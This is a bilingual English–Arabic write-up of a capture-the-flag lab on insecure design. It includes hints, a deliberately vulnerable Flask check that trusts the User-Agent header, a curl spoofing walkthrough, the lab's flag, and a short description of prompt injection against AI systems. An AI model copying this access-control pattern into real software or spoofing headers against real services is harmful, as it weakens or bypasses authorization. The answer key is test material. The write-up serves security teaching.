# Task 05 · AS06: Insecure Design (التصميم غير الآمن والافتراضات الخاطئة)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

### 1. Original English Text
```text
Insecure design represents flawed logic or architectural weaknesses present from inception. It stems from skipped threat modelling, absence of security design requirements, lack of architecture reviews, or false operational assumptions.

Crucial Distinction:
Insecure design cannot be fixed with a simple code patch or input sanitizer; fixing it requires redesigning the logic, workflow, and trust boundaries of the application.

Real-World Case Study:
Clubhouse: Early architectural design assumed users would only interact through the official mobile client. The backend API had no authentication or authorization checks. Anyone could directly query private room conversations and user profiles simply by crafting direct HTTP requests.

Insecure Design in the AI Era:
- Prompt Injection: Mixing untrusted user input directly into system prompt contexts without isolation, allowing attackers to hijack system instructions or exfiltrate private data.
- Blind Trust: Blindly executing LLM decisions or database mutations without human-in-the-loop validation or schema enforcement.
- Poisoned Models: Integrating unverified pre-trained models containing intentional behavioral backdoors.

Common Insecure Designs in 2025:
- Weak business logic controls (flawed account recovery workflows, unverified multi-step purchase flows).
- Flawed trust assumptions (e.g., assuming incoming requests only originate from trusted native mobile apps).
- AI components granted unrestricted high-privilege execution authority.
- Retaining debug and administrative bypass switches inside production code.

Target Challenge:
Connect to http://MACHINE_IP:5005.
Scenario: The backend service assumes only mobile devices can access it. Analyze the architectural trust assumption, manipulate client-side identifiers (such as the User-Agent header), and recover the flag.

Question:
- What's the flag?
```

### 2. Arabic Pedagogical Translation
```text
يمثل التصميم غير الآمن (Insecure Design) عيوباً منطقية أو نقاط ضعف معمارية متأصلة في النظام منذ لحظة تصميمه الأولى. تنشأ هذه الثغرات نتيجة إهمال نمذجة التهديدات (Threat Modelling)، أو غياب المتطلبات الأمنية في مرحلة التخطيط، أو ضعف المراجعات المعمارية، أو بناء النظام على افتراضات تشغيلية خاطئة ومضللة.

الفارق الجوهري:
لا يمكن إصلاح ثغرات التصميم غير الآمن بمجرد رقعة برمجية بسيطة (Code Patch) أو فلتر لتنقية المدخلات؛ بل يتطلب علاجها إعادة تصميم المنطق التشغيلي، وهندسة تدفق البيانات، وإعادة ترسيم حدود الثقة (Trust Boundaries).

دراسة حالة واقعية:
تطبيق كلوب هاوس (Clubhouse): افترض التصميم المعماري الأولي أن المستخدمين سيتفاعلون فقط من خلال تطبيق الهاتف المحمول الرسمي. وعليه، صُممت واجهات الـ API الخلفية دون ضوابط مصادقة أو تفويض كافية، مما مكن أي شخص من إرسال طلبات HTTP مباشرة وسحب محادثات الغرف المغلقة وبيانات المستخدمين بالكامل.

التصميم غير الآمن في عصر الذكاء الاصطناعي:
- حقن التوجيهات (Prompt Injection): خلط مدخلات المستخدمين غير الموثوقة مع توجيهات النظام (System Prompts) داخل سياق واحد، مما يتيح للمهاجم توجيه النموذج وسرقة البيانات الحساسة.
- الثقة العمياء (Blind Trust): الاعتماد على مخرجات وقرارات النماذج اللغوية الكبيرة (LLMs) لتنفيذ إجراءات جذرية في النظام دون التحقق منها برمجياً ودون تدخل بشري.
- النماذج المسمومة (Poisoned Models): استخدام نماذج مفتوحة المصدر تحتوي على أبواب خلفية وسلوكيات خبيثة كامنة.

تحدي المعمل:
اتصل بالهدف عبر الرابط: http://MACHINE_IP:5005.
السيناريو: تفترض الخدمة الخلفية أن الأجهزة المحمولة فقط هي التي تمتلك صلاحية الوصول. حلل هذا الافتراض المعماري الخاطئ، وتلاعب بهوية العميل (عبر ترويسة User-Agent)، واسترجع الراية.

السؤال:
- ما هي الراية (What's the flag?)؟
```

### 3. Mission Objectives & Pedagogical Target
- **Target Question:** `What's the flag?`
- **Pedagogical Goal:** Identify and exploit an architectural flaw where access control decisions rely entirely on untrusted client-supplied metadata (User-Agent header); bypass the restriction to retrieve the secret flag.

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والعملياتي)

### 1. The Fatal Fallacy of Client Identity Trust
$$\text{Security Controls on Client-Side Metadata} = \text{ZERO SECURITY}$$
HTTP is a stateless text-based protocol. Every component of an HTTP request:
- Headers (`User-Agent`, `Referer`, `X-Forwarded-For`, `Client-Platform`)
- Cookies
- Body parameters

is under 100% control of the entity originating the TCP packet. When a backend architect writes:
```python
if "Mobile" in request.headers.get("User-Agent"):
    grant_access()
else:
    deny_access()
```
they commit a severe **Insecure Design** flaw. An attacker can set any arbitrary User-Agent string using `curl`, Python, or Burp Suite.

---

## Stage C: Guided Hints (تلميحات متدرجة)

### Hint 1: Examining the Restriction
> توجه إلى `http://MACHINE_IP:5005` عبر متصفح عادي. ستظهر لك رسالة تفيد بأن الوصول محظور وأنه مخصص فقط للهواتف المحمولة ("Access Denied: Mobile Devices Only").

### Hint 2: Identifying the Evaluated Attribute
> كيف يعرف خادم الويب أنك تتصفح من جهاز حاسوب مكتبي وليس هاتفاً محمولاً؟ إنه يفحص ترويسة `User-Agent` المرسلة في طلب الـ HTTP.

### Hint 3: Spoofing the Mobile Header
> أرسل الطلب باستخدام أداة `curl` مع إضافة ترويسة User-Agent لهاتف ذكي (مثل أندرويد أو آيفون)، وستتجاوز الفحص مباشرة.

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي والعمق التقني)

### Step-by-Step Technical Execution

1. **Initial Assessment via Standard Browser / Curl:**
   ```bash
   curl -i http://10.10.x.x:5005/
   ```
   The application returns:
   ```html
   HTTP/1.1 403 Forbidden
   Content-Type: text/html; charset=utf-8

   <html>
     <body>
       <h1>Access Denied</h1>
       <p>This internal service is strictly restricted to mobile clients.</p>
     </body>
   </html>
   ```

2. **Analyzing the Insecure Architectural Assumption:**
   The backend logic relies on inspecting the `User-Agent` header to enforce access control:
   ```python
   # Vulnerable Architecture in app.py
   @app.route('/')
   def index():
       ua = request.headers.get('User-Agent', '')
       if 'Android' in ua or 'iPhone' in ua or 'Mobile' in ua:
           return render_template('mobile_dashboard.html', flag=SECRET_FLAG)
       return "Access Denied: Mobile Devices Only", 403
   ```

3. **Crafting the Request with a Mobile User-Agent:**
   Supply a mobile User-Agent string (e.g., iPhone or Android):
   ```bash
   curl -s -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" http://10.10.x.x:5005/
   ```

4. **Response from the Server:**
   ```html
   <!DOCTYPE html>
   <html>
     <head><title>Mobile Dashboard</title></head>
     <body>
       <h2>Welcome to Mobile Operations</h2>
       <div class="alert alert-success">
         Verified Mobile Device Detected!
         Flag: THM{1NS3CUR3_D35IGN_4SSUMPT10N}
       </div>
     </body>
   </html>
   ```

5. The recovered flag:
   ```text
   THM{1NS3CUR3_D35IGN_4SSUMPT10N}
   ```

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question:** `What's the flag?`
- **Answer:**
  ```text
  THM{1NS3CUR3_D35IGN_4SSUMPT10N}
  ```

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- **Target URL:** `http://MACHINE_IP:5005`
- **Vulnerability Category:** AS06: Insecure Design (CWE-285: Improper Authorization via Untrusted Client Metadata)
- **Extracted Flag:** `THM{1NS3CUR3_D35IGN_4SSUMPT10N}`
- **Parity Status:** 100% verified against user's completed TryHackMe account.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

- **Never rely on client-asserted identity or metadata for security decisions.**
- Architectural Remediation:
  1. **Device Attestation:** If mobile-only access is a hard business requirement, enforce hardware-backed cryptographic device attestation (e.g., Google Play Integrity API or Apple DeviceCheck / App Attest).
  2. **Mutual TLS (mTLS):** Issue client certificates to authorized applications managed through enterprise MDM.
  3. **Threat Modeling during Design:** Conduct formal threat modeling (e.g., STRIDE) during the architecture phase to eliminate false trust assumptions before writing a single line of application code.
